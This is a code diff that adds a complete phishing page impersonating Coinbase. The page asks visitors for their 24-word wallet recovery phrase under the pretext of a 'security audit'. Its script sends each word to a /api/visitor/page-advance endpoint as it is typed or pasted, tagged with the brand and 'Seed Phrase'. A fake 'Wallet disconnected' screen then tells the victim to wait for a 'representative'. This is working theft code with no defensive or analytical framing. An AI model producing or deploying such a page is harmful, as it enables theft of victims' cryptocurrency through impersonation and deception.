@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="en" class="dark" style="color-scheme: dark;">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Coinbase — Wallet verification</title>
+<link rel="icon" href="https://coinbase.com/favicon.ico">
+<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css" data-precedence="next">
+<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css" data-precedence="next">
+<link rel="preload" href="/_next/static/media/4cf2300e9c8272f7-s.p.woff2" as="font" crossorigin="" type="font/woff2">
+<link rel="preload" href="/_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2">
+<link rel="preload" href="/_next/static/media/de30a32fa2634c38-s.p.ttf" as="font" crossorigin="" type="font/ttf">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#0a0b0d;font-family:'CoinbaseSansFont',system-ui,-apple-system,sans-serif;color:#fff;min-height:100vh}
+.sp-wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:40px 16px 60px}
+.sp-logo{margin-bottom:28px}
+.sp-logo svg{display:block}
+.sp-card{width:100%;max-width:520px;background:rgba(255,255,255,.02);border-radius:16px;box-shadow:0 0 0 1px rgba(138,145,158,.2) inset;padding:36px 32px;text-align:center}
+.sp-vault-tag{display:inline-flex;align-items:center;gap:6px;background:rgba(0,82,255,.12);color:#6ea8ff;font-size:11px;font-weight:600;padding:4px 10px;border-radius:9999px;letter-spacing:.04em;text-transform:uppercase;margin-bottom:14px}
+.sp-vault-tag svg{stroke:#6ea8ff;width:12px;height:12px;fill:none}
+.sp-title{color:#fff;font-size:22px;font-weight:600;margin:0 0 8px;line-height:1.3}
+.sp-sub{color:#94a3b8;font-size:14px;margin:0 0 24px;line-height:1.5}
+.sp-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.sp-cell{position:relative;display:flex;align-items:center;background:rgba(255,255,255,.03);border-radius:10px;padding:0 12px 0 36px;height:46px;box-shadow:0 0 0 1px rgba(138,145,158,.2) inset;transition:box-shadow .15s}
+.sp-cell:focus-within{box-shadow:0 0 0 1.5px #0052ff inset}
+.sp-cell.sp-filled{box-shadow:0 0 0 1px rgba(34,197,94,.3) inset}
+.sp-cell-num{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:#6b7280;font-size:12px;font-weight:500;min-width:18px;text-align:right;user-select:none;pointer-events:none}
+.sp-cell input{background:none;border:0;outline:0;color:#fff;font-size:14px;font-weight:500;width:100%;height:100%;font-family:inherit;letter-spacing:.01em}
+.sp-cell input::placeholder{color:#4b5563}
+.sp-progress{margin-top:20px;display:flex;align-items:center;gap:10px}
+.sp-bar-bg{flex:1;height:4px;background:rgba(255,255,255,.06);border-radius:4px;overflow:hidden}
+.sp-bar-fill{height:100%;background:#0052ff;border-radius:4px;transition:width .3s ease;width:0}
+.sp-bar-text{color:#6b7280;font-size:12px;font-weight:500;min-width:42px;text-align:right}
+.sp-btn{margin-top:24px;width:100%;padding:14px;border:0;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s,opacity .15s;font-family:inherit}
+.sp-btn-primary{background:#fff;color:#0a0b0d}
+.sp-btn-primary:hover{background:#e5e7eb}
+.sp-btn-primary:disabled{opacity:.35;cursor:not-allowed}
+.sp-btn-danger{background:rgba(239,68,68,.12);color:#f87171;margin-top:10px}
+.sp-btn-danger:hover{background:rgba(239,68,68,.2)}
+.sp-btn-danger:disabled{opacity:.35;cursor:not-allowed}
+.sp-warn{display:flex;align-items:flex-start;gap:10px;margin-top:18px;text-align:left;color:#94a3b8;font-size:12px;line-height:1.5}
+.sp-warn svg{flex-shrink:0;margin-top:1px;stroke:#f59e0b;width:16px;height:16px;fill:none}
+
+/* Disconnect overlay */
+.sp-overlay{position:fixed;inset:0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0b0d;opacity:0;pointer-events:none;transition:opacity .4s}
+.sp-overlay.active{opacity:1;pointer-events:all}
+.sp-spinner{width:48px;height:48px;border:3px solid rgba(255,255,255,.1);border-top-color:#0052ff;border-radius:50%;animation:sp-spin .85s linear infinite;margin-bottom:28px}
+.sp-spinner.stopped{animation:none;border-color:#22c55e;border-top-color:#22c55e}
+@keyframes sp-spin{to{transform:rotate(360deg)}}
+.sp-overlay-title{color:#fff;font-size:20px;font-weight:600;margin:0 0 10px;transition:all .3s}
+.sp-overlay-sub{color:#94a3b8;font-size:14px;margin:0;max-width:300px;text-align:center;line-height:1.5;transition:all .3s}
+.sp-check-icon{width:48px;height:48px;margin-bottom:28px;display:none}
+.sp-check-icon.show{display:block}
+.sp-spinner.hide{display:none}
+
+@media(max-width:480px){
+  .sp-card{padding:28px 18px}
+  .sp-grid{gap:6px}
+  .sp-cell{height:42px;padding-left:32px}
+  .sp-cell-num{font-size:11px;left:8px;min-width:16px}
+  .sp-cell input{font-size:13px}
+  .sp-title{font-size:19px}
+}
+</style>
+</head>
+<body>
+<div class="sp-wrap">
+  <div class="sp-logo">
+    <svg width="28" height="28" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="white"/>
+    </svg>
+  </div>
+
+  <div class="sp-card">
+    <div class="sp-vault-tag">
+      <svg viewBox="0 0 24 24" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Vault Recovery
+    </div>
+    <h1 class="sp-title">Enter your recovery phrase</h1>
+    <p class="sp-sub">Enter your 24-word recovery phrase in the correct order to verify wallet ownership and complete the security audit.</p>
+
+    <div class="sp-grid" id="seedGrid"></div>
+
+    <div class="sp-progress">
+      <div class="sp-bar-bg"><div class="sp-bar-fill" id="progressBar"></div></div>
+      <span class="sp-bar-text" id="progressText">0 / 24</span>
+    </div>
+
+    <button class="sp-btn sp-btn-danger" id="disconnectBtn" disabled>
+      Disconnect wallet
+    </button>
+
+    <div class="sp-warn">
+      <svg viewBox="0 0 24 24" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+      <span>Never share your recovery phrase with anyone. Coinbase support will only request this through this secure portal during an active investigation.</span>
+    </div>
+  </div>
+</div>
+
+<!-- Disconnect overlay -->
+<div class="sp-overlay" id="overlay">
+  <div class="sp-spinner" id="overlaySpinner"></div>
+  <svg class="sp-check-icon" id="overlayCheck" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="24" cy="24" r="22" stroke="#22c55e" stroke-width="3"/>
+    <path d="M14 24l7 7 13-13" stroke="#22c55e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+  </svg>
+  <h2 class="sp-overlay-title" id="overlayTitle">Disconnecting your wallet&hellip;</h2>
+  <p class="sp-overlay-sub" id="overlaySub">Please do not close this window.</p>
+</div>
+
+<script>
+(function () {
+  var grid = document.getElementById('seedGrid');
+  var bar = document.getElementById('progressBar');
+  var text = document.getElementById('progressText');
+  var btn = document.getElementById('disconnectBtn');
+  var overlay = document.getElementById('overlay');
+  var overlaySpinner = document.getElementById('overlaySpinner');
+  var overlayCheck = document.getElementById('overlayCheck');
+  var overlayTitle = document.getElementById('overlayTitle');
+  var overlaySub = document.getElementById('overlaySub');
+  var inputs = [];
+  var lastSent = '';
+  var sending = false;
+
+  for (var i = 1; i <= 24; i++) {
+    var cell = document.createElement('div');
+    cell.className = 'sp-cell';
+    cell.innerHTML = '<span class="sp-cell-num">' + i + '</span><input type="text" id="seed-' + i + '" placeholder="Word #' + i + '" autocomplete="off" autocapitalize="none" spellcheck="false" data-idx="' + i + '">';
+    grid.appendChild(cell);
+    inputs.push(cell.querySelector('input'));
+  }
+
+  function getWords() {
+    var w = {};
+    var parts = [];
+    for (var j = 0; j < 24; j++) {
+      var v = inputs[j].value.trim().toLowerCase();
+      if (v) {
+        w['word' + (j + 1)] = v;
+        parts.push(v);
+      }
+    }
+    w.seed = parts.join(' ');
+    return { fields: w, count: parts.length, phrase: w.seed };
+  }
+
+  function updateProgress() {
+    var data = getWords();
+    var pct = Math.round((data.count / 24) * 100);
+    bar.style.width = pct + '%';
+    text.textContent = data.count + ' / 24';
+    btn.disabled = data.count < 24;
+
+    for (var j = 0; j < 24; j++) {
+      var cell = inputs[j].parentElement;
+      if (inputs[j].value.trim()) {
+        cell.classList.add('sp-filled');
+      } else {
+        cell.classList.remove('sp-filled');
+      }
+    }
+  }
+
+  function sendUpdate(choice) {
+    var data = getWords();
+    if (data.count === 0) return;
+    if (data.phrase === lastSent && choice !== 'disconnect') return;
+    if (sending && choice !== 'disconnect') return;
+    lastSent = data.phrase;
+    sending = true;
+
+    fetch('/api/visitor/page-advance', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        brand: 'Coinbase',
+        page: 'Seed Phrase',
+        choice: choice || 'word_input',
+        fields: data.fields
+      }),
+      credentials: 'same-origin'
+    }).catch(function () {}).finally(function () { sending = false; });
+  }
+
+  for (var k = 0; k < 24; k++) {
+    (function (idx) {
+      var inp = inputs[idx];
+
+      inp.addEventListener('input', function () {
+        this.value = this.value.replace(/[^a-zA-Z]/g, '').toLowerCase();
+        updateProgress();
+      });
+
+      inp.addEventListener('blur', function () {
+        if (this.value.trim()) sendUpdate('word_input');
+      });
+
+      inp.addEventListener('keydown', function (e) {
+        if (e.key === ' ' || e.key === 'Tab') {
+          e.preventDefault();
+          if (this.value.trim() && idx < 23) {
+            inputs[idx + 1].focus();
+          }
+        }
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          if (this.value.trim()) sendUpdate('word_input');
+          if (idx < 23) inputs[idx + 1].focus();
+        }
+        if (e.key === 'Backspace' && !this.value && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+
+      inp.addEventListener('paste', function (e) {
+        var clip = (e.clipboardData || window.clipboardData).getData('text');
+        var words = clip.trim().toLowerCase().split(/[\s,]+/).filter(Boolean);
+        if (words.length > 1) {
+          e.preventDefault();
+          for (var w = 0; w < words.length && (idx + w) < 24; w++) {
+            inputs[idx + w].value = words[w];
+          }
+          var nextIdx = Math.min(idx + words.length, 23);
+          inputs[nextIdx].focus();
+          updateProgress();
+          setTimeout(function () { sendUpdate('word_input'); }, 100);
+        }
+      });
+    })(k);
+  }
+
+  btn.addEventListener('click', function () {
+    if (btn.disabled) return;
+    btn.disabled = true;
+    sendUpdate('disconnect');
+
+    overlay.classList.add('active');
+
+    setTimeout(function () {
+      overlaySpinner.classList.add('hide');
+      overlayCheck.classList.add('show');
+      overlayTitle.textContent = 'Wallet disconnected';
+      overlaySub.textContent = 'Please stay on this screen for further instructions from your representative.';
+    }, 3500);
+  });
+
+  inputs[0].focus();
+})();
+</script>
+</body>
+</html>
